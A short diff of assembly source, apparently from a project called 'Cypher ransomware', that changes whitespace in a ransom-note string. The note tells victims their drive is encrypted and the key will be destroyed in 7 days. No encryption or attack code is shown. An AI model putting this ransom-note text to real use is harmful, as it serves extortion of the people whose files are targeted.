@@ -24,7 +24,7 @@ Msg db 0xA, 0xD, 0xA, 0xD
    db '#   Your harddrive is encrypted with military grade    #', 0xA, 0xD
    db '#   encryption, you wont get your files back, since    #', 0xA, 0xD
    db '#  the Cypher ransomware is still under construction   #', 0xA, 0xD
-   db '           										          ', 0xA, 0xD
+   db '           										                         ', 0xA, 0xD
    db '########################################################', 0xA, 0xD, 0xA, 0xD
    db 'Unfortunately there are only 7 days left until the encryption key is destroyed.', 0xA, 0xD, 0xA, 0xD
    db 'Have a nice day,', 0xA, 0xD
